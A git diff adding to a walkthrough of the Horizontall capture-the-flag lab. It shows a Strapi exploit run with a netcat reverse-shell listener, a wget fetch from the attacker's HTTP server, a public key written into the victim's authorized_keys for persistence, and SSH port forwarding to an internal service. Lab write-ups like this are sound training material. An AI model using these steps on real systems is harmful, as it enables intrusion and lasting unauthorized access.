@@ -237,5 +237,82 @@ if len(sys.argv) ==5:
 else:
     print('python3 exploit.py <rhost> <lhost> <jwt> <url>')
  ```
- According to the code and documentation, I have to set up a listener on port 9001 before I run this so I open another terminal window and run `nc -nvlp 9001`. I copy the code into a `.py` file, make it executable, and run it with `
- 
+ According to the code and documentation, I have to set up a listener on port 9001 before I run this so I open another terminal window and run `nc -nvlp 9001`. I copy the code into a `.py` file, make it executable, and run it with `python3 exploit.py  api-prod.horizontall.htb <my ip> <jwt> http://api-prod.horizontall.htb/`
+ <br />
+![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/horizontall%20(4).PNG?raw=true) 
+<br />
+We have successfully obtained a shell. I did some quick enumeration and didn't find much useful, but running `netstat -tulpn` shows me this:
+```markdown
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1871/node /usr/bin/ 
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      - 
+```
+Port 22 and 80 are preceded by 0.0.0.0, meaning that anyone can connect to them. Port 1337 exists because of the exploit we're running. Port 3306 is probably some local mysql database. However, port 8000 is interesting to me, but I can't access it since it's local to this machine, not mine. Therefore, I will port forward it to me. Since ssh is open, I can copy my public ssh key into this user's (strapi) `/home/strapi/.ssh/authenticated_keys`. `ls -la` in the home directory shows me that the strapi user doesn't have this, so I'm making it really quick using `mkdir .ssh` in the home directory. From here I'm going to transfer my ssh public key over. If you don't have one in your attacking machine, just do `ssh-keygen` then access your key from `~/.ssh/id_rsa.pub`. Note that whichever user this key is generated on will have to be the one to do the port forwarding. From here set up a http server with `python3 -m http.server`, then, from the compromised host, run `wget http://<attacking machine ip>:8000/<path to public key based on the directory that the http server was hosted from>`. The result should look something like
+```markdown
+$ wget http://10.10.14.151:8000/id_rsa.pub
+--2021-09-04 07:08:36--  http://10.10.14.151:8000/id_rsa.pub
+Connecting to 10.10.14.151:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 563 [application/vnd.exstream-package]
+Saving to: ‘id_rsa.pub’
+
+     0K                                                       100% 52.4K=0.01s
+
+2021-09-04 07:08:36 (52.4 KB/s) - ‘id_rsa.pub’ saved [563/563]
+```
+and then we can verify that its in our compromised host with `ls -la`. Now we have to append it to the victim's `~/.ssh/authorized_keys` file, so lets do `cat id_rsa.pub > ~/.ssh/authorized_keys`. We can test if we can port forward by first trying to ssh into strapi by running this command from the attacking machine user that had the public key: `ssh -i <path to private key> strapi@<victim ip>`. This gets me:
+```markdown
+┌──(kali㉿kali)-[~/.ssh]
+└─$ ssh -i id_rsa strapi@10.10.11.105                                                                                                                                                                                                  255 ⨯
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Sep  4 07:15:52 UTC 2021
+
+  System load:  0.01              Processes:           193
+  Usage of /:   82.0% of 4.85GB   Users logged in:     0
+  Memory usage: 27%               IP address for eth0: 10.10.11.105
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
+
+```
+So we know that we can ssh with no password, sweet. Now lets port forward. Exit out of the ssh connection and run `ssh -L <local-port>:127.0.0.1:<remote-port> compromised_user@<remote_ip>`. You should get something like
+```markdown
+$ ssh -L 80:127.0.0.1:8000 strapi@10.10.11.105  
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Sep  4 07:18:07 UTC 2021
+
+  System load:  0.0               Processes:           194
+  Usage of /:   82.0% of 4.85GB   Users logged in:     0
+  Memory usage: 27%               IP address for eth0: 10.10.11.105
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Sep  4 07:15:53 2021 from 10.10.14.151
+```
+Now we can access the thing being hosted on the victim's port 8000, on our port 80. A quick nmap scan of our local machine tells me that its an http service, and since we port forwarded, we can access it from our attacking machine. So enter `http://127.0.0.1:80` on your web browser.
+![Image](https://github.com/susMdT/Nigerald/blob/master/assets/images/horizontall%20(5).PNG?raw=true) 
